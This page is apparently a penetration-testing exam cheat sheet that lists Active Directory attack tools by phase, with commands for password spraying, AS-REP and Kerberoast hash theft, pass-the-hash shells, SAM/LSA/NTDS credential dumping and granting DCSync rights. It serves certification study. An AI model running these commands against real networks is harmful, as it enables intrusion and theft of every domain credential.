---
title: "AD Tools"
date: 2026-06-20
weight: 90
draft: false
summary: "AD tools organized by what they do, with role, when to use, and OSCP availability."
---

A complete overview of AD tools, organized by what they do rather than alphabetically. Each entry lists its role, when to use it, eCPPT availability, and OSCP availability.

- Source: https://heretek.dev/oscp-cheatsheet/active-directory-tools/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
- Replace `<IP>`, `<DC_IP>`, `<DOMAIN>`, `<USER>`, `<PASS>`, `<NTLM_HASH>` in the code with the values you found

## Finding usernames (Phase 1 — no creds needed)

### nxc (NetExec / CrackMapExec)

- Role: the AD multi-tool. Talks SMB, LDAP, WinRM. Enumerates users/shares/groups, sprays passwords, validates creds, dumps hashes.
- When to use: at almost every stage of the chain. The default tool.
- eCPPT: allowed (confirmed by multiple reviewers)
- OSCP: allowed
- Key commands:

```bash
nxc smb <IP> -u '' -p '' --users           # enumerate users (null session)
nxc smb <IP> -u '' -p '' --shares           # list shares (null session)
nxc smb <IP> -u '' -p '' --rid-brute        # find users via RID brute force
nxc smb <IP> -u 'USER' -p 'PASS' --users   # enumerate users (with creds)
nxc smb <IP> -u 'USER' -p 'PASS' --shares  # list shares (with creds)
nxc smb <IP> -u users.txt -p 'Password1!' --continue-on-success  # password spray
nxc smb <SUBNET>/24 -u 'USER' -p 'PASS'    # find where creds work (Pwn3d! = admin)
nxc smb <IP> -u 'USER' -p 'PASS' --sam     # dump local hashes
nxc smb <IP> -u 'USER' -p 'PASS' --lsa     # dump LSA secrets
nxc winrm <IP> -u 'USER' -p 'PASS'         # check WinRM access
```

### kerbrute

- Role: asks Kerberos whether a username is valid. The DC responds differently for valid and invalid users.
- When to use: Phase 1 — finding valid usernames when SMB null sessions are blocked.
- eCPPT: allowed (confirmed preinstalled on the exam Kali)
- OSCP: allowed (download it yourself)
- Install (it is not an apt package):

```bash
# If Go is installed (check: which go)
go install github.com/ropnop/kerbrute@latest
sudo cp ~/go/bin/kerbrute /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute

# If there is no ARM64 binary (Apple Silicon), build from source with Go
```

- Key commands:

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt
```

- Wordlist priority (fastest first):

```bash
# 1. Top priority — small, fast, covers most real AD environments (~10k)
/usr/share/seclists/Usernames/Names/names.txt

# 2. Tiny — only common service accounts
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# 3. Balanced — 10k usernames
/usr/share/seclists/Usernames/xato-net-10-million-usernames-10000.txt

# 4. Last resort — 10 million entries, takes hours
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

- Warning: do not start with xato-net-10-million-usernames.txt — it takes hours. Starting with names.txt covers most boxes within seconds.

### rpcclient

- Role: direct Windows RPC communication. Can enumerate users, groups, etc. over a null session.
- When to use: Phase 1 — a backup when nxc fails.
- eCPPT: allowed (preinstalled on Kali)
- OSCP: allowed
- Key commands:

```bash
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
rpcclient -U '' -N <DC_IP> -c 'enumdomgroups'
```

### enum4linux

- Role: automated SMB/RPC enumeration script. Runs several enumeration queries at once.
- When to use: Phase 1 — quick automated scan of users, shares, groups.
- eCPPT: allowed (preinstalled on Kali)
- OSCP: allowed
- Key commands:

```bash
enum4linux -U <DC_IP>          # users
enum4linux -a <DC_IP>          # everything
```

### ldapsearch

- Role: direct LDAP directory queries. Search users, groups, description, and other AD attributes.
- When to use: Phase 1 — when you need a specific AD attribute or anonymous LDAP queries.
- eCPPT: allowed (preinstalled on Kali)
- OSCP: allowed
- Key commands:

```bash
ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

## Getting hashes without creds (Phase 2-3)

### impacket-GetNPUsers (AS-REP Roasting)

- Role: finds accounts with "Kerberos pre-authentication not required" and retrieves their hash without a password.
- When to use: Phase 2 — the first attack right after you have usernames. Before any brute force.
- eCPPT: allowed
- OSCP: allowed
- Principle: with pre-auth disabled, the DC returns an AS-REP blob encrypted with the user's key; it is not a stored hash, so it must be cracked.
- Key commands:

```bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile valid_users.txt -format hashcat -outputfile asrep.txt
```

- hashcat mode: 18200
- john: `john asrep.txt --wordlist=rockyou.txt`

## Getting hashes with creds (Phase 7)

### impacket-GetUserSPNs (Kerberoasting)

- Role: requests service tickets for accounts with an SPN. The ticket is encrypted with the service account password — crack it offline.
- When to use: Phase 7 — after obtaining your first creds. Any domain user can do it.
- eCPPT: allowed
- OSCP: allowed
- Principle: any domain user can request a service ticket. The DC encrypts it with the service account password hash.
- Key commands:

```bash
impacket-GetUserSPNs <DOMAIN>/'USER':'PASS' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

- hashcat mode: 13100
- john: `john kerberoast.txt --wordlist=rockyou.txt`

### AS-REP vs Kerberoasting — how to tell them apart

- Creds required — AS-REP Roasting: no / Kerberoasting: yes
- Target — AS-REP Roasting: users with "pre-auth disabled" / Kerberoasting: service accounts with an SPN
- impacket tool — AS-REP Roasting: GetNPUsers / Kerberoasting: GetUserSPNs
- hashcat mode — AS-REP Roasting: 18200 / Kerberoasting: 13100
- Position in the chain — AS-REP Roasting: Phase 2 (before creds) / Kerberoasting: Phase 7 (after creds)

## Hash cracking

### hashcat

- Role: crack hashes on GPU (or CPU). Fast, but occasionally buggy.
- eCPPT: allowed (known to have issues — keep john as a backup)
- OSCP: allowed
- Key commands:

```bash
hashcat -m 18200 asrep.txt wordlist.txt      # AS-REP hashes
hashcat -m 13100 kerberoast.txt wordlist.txt  # Kerberos TGS hashes
hashcat -m 5600 ntlmv2.txt wordlist.txt       # NTLMv2 hashes
hashcat -m 1000 ntlm.txt wordlist.txt         # NTLM hashes
```

### john (John the Ripper)

- eCPPT: allowed
- OSCP: allowed
- Key commands:

```bash
john hash.txt --wordlist=rockyou.txt          # wordlist cracking
john hash.txt --show                          # show cracked passwords
```

## Domain mapping (Phase 6)

### bloodhound-python

- Role: collect all AD data from Kali (users, groups, permissions, computers). Produces JSON for the BloodHound GUI.
- When to use: Phase 6 — immediately after obtaining your first creds.
- eCPPT: allowed (available on Kali)
- OSCP: allowed
- Key commands:

```bash
bloodhound-python -u 'USER' -p 'PASS' -ns <DC_IP> -d <DOMAIN> -c All
```

### BloodHound GUI (Community Edition)

- Role: visualize AD data and show attack paths to Domain Admin.
- When to use: right after bloodhound-python collection. Upload the JSON, search your user, use PATHFINDING.
- eCPPT: allowed (preinstalled on the exam Kali)
- OSCP: allowed
- Key actions:

- Upload JSON files (drag and drop)
- Search your user → right-click → Mark as Owned
- PATHFINDING: start = your user, end = Domain Admins
- Click an edge between nodes → shows the relationship type and how to abuse it

## Getting a shell (Phase 8)

### evil-winrm

- Role: connect to Windows over WinRM (port 5985). Interactive PowerShell shell. Best for file upload/download.
- When to use: 5985 is open and you have valid creds.
- eCPPT: allowed but known to break — Docker workaround: `docker run --rm -ti oscarakaelvis/evil-winrm`
- OSCP: allowed
- Key commands:

```bash
evil-winrm -i <IP> -u 'USER' -p 'PASS'
evil-winrm -i <IP> -u 'USER' -H '<NTLM_HASH>'    # Pass-the-Hash
```

### impacket-psexec

- Role: creates a service on the target over SMB and gives a SYSTEM shell. Loud but reliable.
- When to use: you have admin creds and need a SYSTEM shell.
- eCPPT: allowed
- OSCP: allowed
- Key commands:

```bash
impacket-psexec '<DOMAIN>/<USER>:<PASS>'@<IP>
impacket-psexec '<DOMAIN>/<USER>'@<IP> -hashes :<NTLM_HASH>    # Pass-the-Hash
```

### impacket-wmiexec

- Role: similar to psexec but stealthier. Uses WMI instead of creating a service.
- When to use: psexec fails or you want less noise.
- eCPPT: allowed
- OSCP: allowed
- Key commands:

```bash
impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<IP>
```

### xfreerdp

- Role: RDP client. Provides a full graphical desktop.
- When to use: 3389 is open or you need GUI access.
- eCPPT: allowed
- OSCP: allowed
- Key commands:

```bash
xfreerdp /u:'USER' /p:'PASS' /v:<IP> /cert-ignore
```

## Credential dumping

### impacket-secretsdump

- Role: dumps every hash on a machine (SAM, LSA, NTDS.dit). DCSync can dump all domain hashes too.
- When to use: Phase 9 — on every machine you compromise. Phase 10 — DCSync when you have DA or DCSync rights.
- eCPPT: allowed
- OSCP: allowed
- Key commands:

```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<IP>              # dump everything
impacket-secretsdump '<DOMAIN>/<USER>'@<IP> -hashes :<HASH>    # with a hash
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USER>:<PASS>'@<DC_IP>  # DC only — all domain hashes
```

### Meterpreter + Kiwi (Metasploit)

- Role: Metasploit's built-in credential dumper. Load the Kiwi extension (Mimikatz) to dump hashes, passwords, and tickets.
- When to use: when you have a Meterpreter shell on a compromised machine.
- eCPPT: allowed — no restrictions (use on every machine)
- OSCP: restricted — one machine only
- Key commands:

```text
meterpreter> load kiwi
meterpreter> creds_all            # all credentials in memory
meterpreter> lsa_dump_sam         # local account hashes
meterpreter> lsa_dump_secrets     # service account passwords
meterpreter> hashdump             # quick NTLM hash dump
```

## Modifying AD objects (ACL abuse)

### net rpc

- Role: remotely modify AD groups and user passwords from Kali. A built-in Linux command.
- When to use: BloodHound shows GenericAll on a group (add yourself) or ForceChangePassword on a user.
- eCPPT: allowed (built into Linux/Kali)
- OSCP: allowed
- Key commands:

```bash
# Add a user to a group
net rpc group addmem "GROUP_NAME" "USERNAME" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>

# Change a user's password
net rpc password "TARGET_USER" "NewP@ss123!" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>
```

### impacket-dacledit

- Role: modify AD object permissions (ACL/DACL). Can grant DCSync rights.
- When to use: BloodHound shows WriteDACL on the domain.
- eCPPT: unclear whether it is on the exam Kali (recent tool)
- OSCP: availability uncertain
- Key commands:

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'USER' -target-dn 'DC=<DOMAIN>,DC=<TLD>' '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
```

- If missing, alternative: use PowerView from a Windows shell or evil-winrm

## Exam key reminders

### eCPPT only

- No Metasploit restrictions — use it everywhere
- Desktop wordlist order: common_corporate_passwords.lst → seasons.txt → months.txt → xato-10k → rockyou
- Evil-WinRM may break — use the Docker workaround
- hashcat may be buggy — keep john as a backup
- No internet — only preinstalled tools
- Always use single quotes when saving hashes: `echo '$hash' > file.txt`

### OSCP only

- Metasploit on one machine only
- A report is mandatory
- AI/LLM use is prohibited
- Proctored exam

### Common

- New credential found → spray it on every machine immediately
- Dump creds on every machine you compromise
- Record every cred in a table: username / password-hash / source / where it works
